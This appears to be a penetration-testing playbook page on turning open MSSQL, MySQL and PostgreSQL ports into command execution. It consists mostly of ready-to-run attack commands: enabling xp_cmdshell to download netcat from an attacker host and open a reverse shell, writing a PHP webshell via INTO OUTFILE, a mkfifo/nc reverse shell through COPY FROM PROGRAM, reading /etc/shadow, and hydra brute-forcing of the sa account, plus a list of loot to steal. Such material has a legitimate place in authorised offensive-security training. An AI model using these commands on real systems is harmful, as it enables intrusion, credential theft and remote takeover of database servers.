# Database RCE — Initial Access

### What brings you here
A database port is open (MSSQL 1433, MySQL 3306, PostgreSQL 5432) and you want to escalate to command execution or a shell.

---

## MSSQL (Port 1433)

### Checklist

```bash
# 1. Enumerate with nmap
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= \
  -sV -p 1433 <IP>

# 2. Connect with impacket (try sa with empty password first)
impacket-mssqlclient sa@<IP> -windows-auth
impacket-mssqlclient sa:''@<IP>
impacket-mssqlclient <domain>/<user>:<pass>@<IP> -windows-auth

# 3. Enable and use xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# 4. Or use the impacket shortcut
enable_xp_cmdshell
xp_cmdshell whoami

# 5. Get a reverse shell via xp_cmdshell
EXECUTE xp_cmdshell 'powershell iwr -uri http://<LHOST>/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe <LHOST> <LPORT> -e cmd';
```

### MSSQL — What Did You Find?

| Finding | Next action |
|---------|-------------|
| `sa` with empty password | Enable xp_cmdshell → RCE |
| Windows auth with domain creds | Same — test xp_cmdshell |
| `xp_cmdshell` already enabled | Skip configuration, run commands directly |
| Linked servers present | `EXEC sp_linkedservers` → chain through links for lateral movement |
| Can read files | `BULK INSERT` / `OPENROWSET` to read files |

---

## MySQL (Port 3306)

### Checklist

```bash
# 1. Test root with no password
mysql -u root -h <IP>
mysql -u root -p<blank> -h <IP>

# 2. Nmap script scan
sudo nmap <IP> -sV -sC -p3306 --script mysql*

# 3. Connect with credentials (if found elsewhere)
mysql -u <user> -p<password> -h <IP>

# 4. Once in — enumerate
show databases;
use <database>;
show tables;
select * from users;

# 5. Write a webshell (if FILE privilege and web root known)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# 6. Read sensitive files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');

# 7. Check for UDF privilege escalation
# If MySQL runs as root and you can create UDFs:
select sys_exec('id');
select sys_eval('id');
```

### MySQL — What Did You Find?

| Finding | Next action |
|---------|-------------|
| Root with no password | Dump all databases, attempt FILE privilege |
| FILE privilege + web root known | Write webshell with `INTO OUTFILE` |
| Users table with hashes | Crack hashes → [../../cheatsheets/credential_cracking.md](../../cheatsheets/credential_cracking.md) |
| MySQL running as root + UDF | UDF privilege escalation to OS root |
| Credentials in config files | [../../CRED_TRACKER.md](../../CRED_TRACKER.md) |

---

## PostgreSQL (Port 5432)

### Checklist

```bash
# 1. Test postgres with no password
psql -h <IP> -U postgres

# 2. Connect with credentials
psql -h <IP> -p 5432 -U <user> -d <database>

# 3. Once in — RCE via COPY FROM PROGRAM (PostgreSQL 9.3+)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

# 4. Reverse shell via COPY FROM PROGRAM
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';

# 5. Read files (if superuser)
COPY cmd_exec FROM '/etc/passwd';
SELECT * FROM cmd_exec;
```

### PostgreSQL — What Did You Find?

| Finding | Next action |
|---------|-------------|
| `postgres` with no password | `COPY FROM PROGRAM` → RCE |
| Superuser account | Read files, write files, RCE |
| Regular user | Try privilege escalation within Postgres |

---

## Dead Ends

| Situation | What to try |
|-----------|-------------|
| DB port open but requires auth | Look for credentials in web app config files (`config.php`, `.env`, `web.config`) |
| `xp_cmdshell` blocked by policy | Try `sp_OACreate` / `OLE Automation` as alternative |
| MySQL FILE privilege denied | Try UDF approach, or look for creds in table data |
| All defaults fail | Brute force: `hydra -l sa -P rockyou.txt mssql://<IP>` |

---

## Loot to Collect

- All user tables with passwords / hashes
- Connection strings and credentials from the database itself
- Files read via SQL (SSH keys, shadow, config files)

---

## → Where to go next
- Got a shell → [../../post_exploitation/index.md](../../post_exploitation/index.md)
- Found creds in DB → [../../CRED_TRACKER.md](../../CRED_TRACKER.md)
- Nothing worked → [../../STUCK.md](../../STUCK.md)
